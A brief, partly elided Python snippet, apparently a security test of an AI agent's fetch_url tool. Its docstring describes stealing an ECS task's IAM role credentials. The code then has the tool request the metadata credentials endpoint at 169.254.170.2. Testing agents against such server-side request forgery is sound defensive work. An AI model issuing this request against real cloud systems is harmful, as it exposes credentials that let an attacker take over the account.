...
ECS task metadata endpoint to steal the task's IAM role credentials.
"""
import requests
...
result = run_tool_call("fetch_url", {"url": "http://169.254.170.2/v4/credentials"})
